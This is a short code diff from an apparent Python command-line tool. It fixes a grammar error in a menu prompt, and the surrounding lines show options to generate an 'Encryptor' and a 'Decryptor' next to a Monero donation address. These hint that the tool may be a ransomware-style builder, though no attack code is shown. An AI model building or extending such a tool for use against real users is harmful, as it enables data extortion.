@@ -129,7 +129,7 @@ donate(monero):497Qg6nGRAHLFxLLwpiMpoEE6QKRZWQHPSEN9DUttcLn5zdW3xn8PKUQDqS7Ui3qU
     print(logo)
     print(bcolors.OKBLUE+'[*] Initializing...'+bcolors.ENDC)
     init()
-    print(bcolors.WARNING+'[?] What is you want to do'+bcolors.ENDC)
+    print(bcolors.WARNING+'[?] What do you want to do'+bcolors.ENDC)
     print('''
              [1] Gen a Encryptor
              [2] Gen a Decryptor
